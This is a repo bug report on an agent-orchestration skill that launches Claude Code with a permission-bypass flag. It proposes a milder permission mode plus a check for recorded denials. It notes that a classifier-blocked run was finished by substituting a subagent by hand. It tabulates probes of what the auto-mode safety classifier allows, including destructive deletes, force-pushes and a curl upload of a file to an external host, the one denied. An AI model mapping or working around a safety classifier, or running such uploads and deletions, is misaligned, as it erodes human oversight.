---
id: bug-3
title: Orchestrate dispatches with a stronger permission flag than it needs
created: 2026-08-31
tags: orchestrate, permissions
updated: 2026-09-01T10:24:23Z
groom-elapsed: 1103
---

## Symptom

`backlog-orchestrate` cannot dispatch at all from a session running under the auto-mode
permission classifier. The dispatch line is refused before it runs:

```
Permission for this action was denied by the Claude Code auto mode classifier.
```

The refusal is entirely about `--dangerously-skip-permissions`, which
`skills/backlog-orchestrate/SKILL.md:415` hard-codes into the dispatch. It stopped the
first real end-to-end run (run-20260831-211011) dead at step 4, and the run only
completed because a subagent was substituted for the headless session by hand.

The flag is also stronger than the job needs, and the paragraph justifying it rests on a
premise that is not true of the current CLI.

## Repro

Two probes, run on this machine 2026-08-31 against the installed CLI, both headless and
both with `--permission-mode auto` rather than the flag:

```bash
claude -p "Run the shell command 'sw_vers -productVersion' using Bash …" \
  --permission-mode auto --output-format stream-json --verbose
# TOOL_USE: Bash {"command":"sw_vers -productVersion"} → RESULT: "26.5.1" → FINAL: success

claude -p "Run the shell command 'sudo -n true' using Bash …" \
  --permission-mode auto --output-format stream-json --verbose
# TOOL_USE: Bash {"command":"sudo -n true; echo \"exit=$?\""} → ran; sudo itself refused
# FINAL: success
```

Arbitrary `Bash` ran unprompted under `auto` in both. Neither probe found a call the
classifier actually gated, so `auto`'s refusal boundary is **not** established — see
`## Fix`, this is the gap that has to close before the fix is safe.

`claude --help` lists six modes, not the two the skill's prose implies:

```
--permission-mode <mode>  (choices: "acceptEdits", "auto", "bypassPermissions",
                           "manual", "dontAsk", "plan")
```

## Affects

- `skills/backlog-orchestrate/SKILL.md:415` — the step 4 dispatch line.
- `skills/backlog-orchestrate/SKILL.md:521` — the step 5 retry/resume line, same flag.
- `skills/backlog-orchestrate/SKILL.md:449` — "Why `--dangerously-skip-permissions` is
  acceptable here, and only here", the paragraph whose premise is wrong.
- Section 10's `--resume` path, which instructs both lines be reused "unchanged".
- `shared/agent.ts:62` — `PERMISSION_LADDER` is `plan, acceptEdits, auto,
  bypassPermissions`. It mirrors the dashboard's list and knows nothing of `manual` or
  `dontAsk`. Not wrong, but worth a look if the fix wants to name a mode the ladder
  cannot currently express.

## Cause

Two things, neither a coding mistake: one false premise in the prose, and one flag that
outranks the job it was chosen for. Line numbers below are current — the file has grown
since this was filed, so the dispatch line is now `SKILL.md:469`, the rationale paragraph
`SKILL.md:503`, and the retry line `SKILL.md:575`.

**The premise.** SKILL.md:503 argues:

> a headless session cannot answer a permission prompt, so a prompt inside one is a
> hang — an unattended run that stops forever with nobody to unstick it

Wrong on this CLI, and now measured rather than cited. Under
`claude -p --permission-mode auto`, a refused call comes back as an ordinary
`tool_result` with `is_error: true`, the session reads it and keeps working, and the
process exits `0`. There is no prompt to hang on, and CLI 2.1.250 has no
`--permission-prompt-tool` flag at all (checked in `claude --help`), so the
no-prompt-tool case the docs describe is the only case there is.

**What `auto` actually refuses.** Twelve probes, this machine, 2026-09-01, CLI 2.1.250,
each its own `claude -p … --permission-mode auto --output-format stream-json --verbose`
session in a throwaway git repo. No `permissions.allow` entry for `Bash` exists in
`~/.claude/settings.json` or either project settings file, so these measure `auto` itself
and not an allowlist:

| Probed action | Verdict |
|---|---|
| `pnpm test` (pnpm also wrote `node_modules/` + lockfile) | ran |
| `echo more >> tracked.txt && git add -A && git commit` | ran |
| `Write` tool creating a new file | ran |
| `node -e "…writeFileSync…"` | ran |
| `curl` GET `registry.npmjs.org/-/ping` → 200 | ran |
| `rm -rf sub` (recursive delete inside cwd) | ran |
| append to `$HOME/probe-outside.txt` (write outside cwd) | ran |
| `git reset --hard HEAD~1` | ran |
| `chmod -R 777 .` (`.git/` included) | ran |
| `git push --force origin main` | ran |
| `rm -rf "$HOME/probe-doomed-dir"` | ran |
| `curl -X POST --data-binary @package.json https://example.com` | **denied** |

One of twelve. The boundary is not destruction — every destructive-but-local thing on
that list was permitted, including two the repo's own invariants treat as dangerous — it
is **egress**: sending a local file's contents to an external host. So `auto` clears an
execute session's entire real workload (file edits, arbitrary `node`, `pnpm test`, `git`,
recursive deletes, network reads), and the one class it gates is a class
`backlog-execute` has no business performing. That is the opposite of the risk `## Fix`
was filed worrying about.

With the hang gone, the argument for reaching the top of the ladder goes with it. The
four walls the same paragraph describes — disposable worktree, independent review,
verification gate, merge only by the orchestrator — are all still true and still good;
they just no longer require `bypassPermissions` specifically, because the rung below it
already runs every command an execute session issues.

`acceptEdits` is genuinely not enough, so this is not an argument for the bottom of the
ladder either: per the docs it auto-approves file edits plus a fixed list (`mkdir`,
`touch`, `rm`, `rmdir`, `mv`, `cp`, `sed`), and arbitrary `pnpm test` or `git` still
prompt. `auto` is the lowest rung that clears the real workload.

**The repo already decided this, one seam over.** `docs/invariants.md:445-456` defaults
*dispatch's* unattended sessions to `auto` and keeps `bypassPermissions` a per-launch
choice, because "asking for the most a host allows by default is how a convenience
becomes an incident." Orchestrate's hard-coded flag is that sentence's counterexample,
living two directories away.

**The residual hazard is real, but it is not the one that was feared.** A denial is
loud in the transcript and silent everywhere else. The run's final `result` event reports
`subtype: "success"`, `is_error: false`, and the process exits `0` **even when every tool
call in the session was denied** — observed twice (the egress probe, and a `dontAsk`
probe where `Bash` was refused outright). What distinguishes those runs is one
machine-readable field on that same event:

```json
"permission_denials": [
  { "tool_name": "Bash", "tool_use_id": "toolu_…", "tool_input": { "command": "curl -X POST …" } }
]
```

Step 5's Inspect reads the *item file*, never the transcript, so today nothing in this
skill could tell a clean run from a denied one. That is why the fix is two changes, not
one: a milder flag, plus a check that reads that array.

**One caveat on the table above: the classifier is a model judgment, not a list.** This
very session — interactive `auto` — refused `git reset --hard HEAD~1`, an `rm -rf` under
`$HOME`, `git push --force`, and even the probe launcher whose *prompt text* merely named
them, all of which headless `auto` permitted in the scratch repo. Same mode name,
different verdicts, presumably weighing cwd and surrounding context. Read the table as
what `auto` typically permits, never as a contract — the design has to tolerate a denial
happening, which is exactly what step 4 below is for.

## Fix

Six edits and a test. The direction the item guessed at is right; the probes above closed
the gap that blocked it and turned the third "worth settling" bullet into a requirement.

1. **Swap the flag on both dispatch lines.** `SKILL.md:469` (step 4) and `SKILL.md:575`
   (step 5's retry): `--dangerously-skip-permissions` → `--permission-mode auto`. Every
   other flag stays, `--verbose` among them. `--resume` honours the mode — verified:
   `claude -p --resume <sid> --permission-mode auto` reported `permissionMode=auto` in
   its own `init` event and ran `Bash` normally. Section 10's "reuse both lines
   unchanged" needs no edit; it points at the lines, not at the flag.

2. **Rewrite the rationale at `SKILL.md:503`.** Drop the hang sentence entirely. Keep the
   four walls verbatim — they are still what makes an unattended session tolerable, they
   just no longer buy the top rung. State the real semantics in their place: a denied
   call returns an error the session reads and continues past, the run still exits `0`
   and still reports `success`, and the denial is recorded in the result event's
   `permission_denials`. Carry the one number worth carrying — of twelve probed actions
   `auto` denied one, an upload of a local file to an external host — and the caveat that
   the boundary is a classifier's judgment rather than a fixed list.

3. **Fix the same premise at `docs/invariants.md:451`**, which says a lower rung means "a
   session that stops on its first unapprovable tool call and silently does nothing."
   Half right is worse than wrong here: it does not stop, and it does not do nothing — it
   continues, and improvises around the refusal. That is the failure mode worth naming in
   a file whose job is to explain why the ladder's default sits where it does.

4. **Add the denial check that makes the milder flag safe.** New reader in
   `orchestrate.mjs`, beside `findSessionIdInJsonl` (`:1386`) and sharing its discipline —
   `split('\n').slice(0, -1)` for the live-append tail, lenient skip on an unparseable
   line — returning the `permission_denials` array from the **last** `type: "result"`
   event, and `[]` when the field is absent (older transcripts, or a run with none).
   Surface it in step 5's Inspect (`SKILL.md:551`) as something read *before* the item
   file's three shapes are judged: on a non-empty array the item is not clean even if it
   looks done, because exit code, result subtype and `is_error` all say success while a
   command the session needed never ran. Treat that like the failure shapes step 5
   already has — ask the user, and do not merge a diff built around a refused call.

5. **Record the mode on the run.** A field on the queue item, written by the
   `stage <id> dispatched` call that already takes `--worktree` and `--branch`. Nothing in
   `run.json` says what a session was dispatched under today, so a denial found in a log
   has no adjacent record of the mode that produced it — and this fix makes the mode a
   thing that can vary between runs, which it previously wasn't.

6. **`dontAsk` plus `--allowedTools` is rejected, and the probe is why.** Under
   `--permission-mode dontAsk` with no allowlist, `pnpm test` was refused outright —
   "Permission to use Bash has been denied because Claude Code is running in don't ask
   mode" — and the run still finished `subtype: "success"`. An execute session under it is
   dead on arrival unless every command it will ever need is enumerated in advance, which
   is the one thing a session doing unenumerated work cannot have. Tighter is not better
   when the tightening has to be guessed ahead of the work.

No change to `shared/agent.ts:62` — `auto` is already `PERMISSION_LADDER`'s third rung, so
the mode this fix names is one the ladder can express and the board can already show.
`manual` and `dontAsk` stay absent from it, correctly.

**Verification.** Two tests in `skills/backlog-orchestrate/tools/orchestrate.test.mjs`:
a guard asserting both of SKILL.md's dispatch lines carry `--permission-mode auto` and
that `--dangerously-skip-permissions` appears nowhere under `skills/` — this is precisely
the flag whose quiet reintroduction nobody would notice — and a unit test for the new
reader over fixture transcripts: denial present → one entry, field absent → `[]`, a
partial trailing line tolerated, and the last `result` event winning when a resumed
transcript holds more than one.
